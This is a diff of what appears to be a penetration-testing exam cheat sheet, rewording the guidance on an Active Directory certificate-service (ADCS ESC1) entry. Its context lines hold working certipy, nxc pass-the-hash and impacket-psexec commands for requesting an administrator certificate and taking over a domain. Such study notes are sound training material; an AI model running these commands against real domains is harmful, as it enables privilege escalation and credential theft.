@@ -725,7 +725,7 @@ impacket-psexec <domain>/<user>@<dc> -k -no-pass`,
     id: "ad-adcs",
     section: "Active Directory",
     title: "ADCS, only if it is there",
-    look: "A certificate service in the domain. ESC1 means you can ask for a cert as someone else. If find returns no vulnerable template, ADCS is dead. Do not learn ESC2 through ESC8 during the exam.",
+    look: "Open this only after a domain username and password are already yours, and roast, ACL, and shares did not give you a path. You are checking whether a certificate authority exists. You are not working through ESC2 and the rest.",
     cmd: `certipy find -u <user>@<domain> -p '<pass>' -dc-ip <dc> -vulnerable -stdout
 # ESC1 only. CA name and template name come from that output.
 certipy req -u <user>@<domain> -p '<pass>' -dc-ip <dc> -ca '<CA>' -template '<Template>' -upn administrator@<domain>
@@ -733,8 +733,8 @@ certipy auth -pfx administrator.pfx -dc-ip <dc>`,
     alive: `ESC1 and Enrollee Supplies Subject
 certipy auth prints an NT hash
 nxc smb <dc> -u administrator -H <hash> prints (Pwn3d!)`,
-    dead: "No vulnerable templates, or certipy cannot find a CA. Leave certificates.",
-    next: "auth prints an NT hash. Pass it. Do not crack it. One template.",
+    dead: "No CA, or find prints no vulnerable template. Stop. Do not open the next ESC number because this one was empty.",
+    next: "One template, the one find marked. auth prints an NT hash. Pass it with nxc. Do not request a second template.",
   },
   {
     id: "ad-zerologon",
